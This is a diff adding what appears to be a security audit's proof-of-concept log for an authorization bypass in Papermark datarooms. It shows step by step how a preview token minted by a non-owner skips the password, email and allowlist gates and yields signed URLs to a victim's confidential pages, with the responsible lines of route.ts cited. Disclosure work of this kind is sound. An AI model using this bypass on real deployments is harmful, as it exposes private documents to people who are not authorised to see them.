@@ -1,0 +1,45 @@
+PM-01 EXTENSION: dataroom links  2026-09-27T12:52:35Z
+Dataroom link cmujghwo30007mqcv3xonjweg: password set, emailProtected+emailAuthenticated, allowList=[invited@partner.test]
+
+--- CONTROL: anonymous, no password, no preview token ---
+{"message":"Email is required."}
+  HTTP 400
+
+--- STEP 1: Mallory mints a preview token for the dataroom link she does not own ---
+  previewToken=a24721ec861edcc13a85ca35...
+
+--- STEP 2: ATTACK. No password, no email, no allowlist membership ---
+  HTTP 200
+  response keys: ['message', 'isPreview', 'verificationToken', 'conversationsEnabled', 'enableVisitorUpload', 'uploadFolderAllowList', 'agentsEnabled', 'dataroomName']
+  dataroom name: None
+  documents returned: 0
+  folders returned: 0 []
+
+--- STEP 3: request a DOCUMENT inside that dataroom, still no password/email ---
+  HTTP 200
+  keys: ['message', 'isPreview', 'pages', 'fileType', 'viewerEmail', 'canDownload', 'conversationsEnabled', 'agentsEnabled', 'dataroomName']
+  pages returned: 3
+    page 1 -> http://papermark-audit.pm-audit-minio:9000/cmuiv8b3q0001mqejmb79rz8g/doc_seed/page-1.jpg?X-Amz-...
+    page 2 -> http://papermark-audit.pm-audit-minio:9000/cmuiv8b3q0001mqejmb79rz8g/doc_seed/page-2.jpg?X-Amz-...
+    page 3 -> http://papermark-audit.pm-audit-minio:9000/cmuiv8b3q0001mqejmb79rz8g/doc_seed/page-3.jpg?X-Amz-...
+
+--- STEP 4: request a document that is NOT in this dataroom ---
+  document 'Victim OUTSIDE-dataroom Secret' (cmujtlhc00001mqfnhim3mqce) was never added to the room
+  HTTP 403  {"message":"Unauthorized access."}
+
+--- STEP 5: fetch the signed URLs ---
+  page 1: VICTIM CONFIDENTIAL PAGE 1
+ [HTTP 200]
+  page 2: VICTIM CONFIDENTIAL PAGE 2
+ [HTTP 200]
+  page 3: VICTIM CONFIDENTIAL PAGE 3
+ [HTTP 200]
+
+BOUNDARIES THAT HELD (reported accurately):
+  - a document NOT in the dataroom -> 403 (views-dataroom/route.ts:1102-1117)
+  - per-document group permissions still evaluated at :1119-1191, outside the isPreview guard
+
+WHAT THE PREVIEW TOKEN SKIPS (views-dataroom/route.ts):
+  :306 if (!isPreview)              -> verifyDataroomSession skipped
+  :343 if (!dataroomSession && !isPreview) wraps the whole gate block:
+       :364 emailProtected, :382 password, :417 agreement, :470 group allowlist
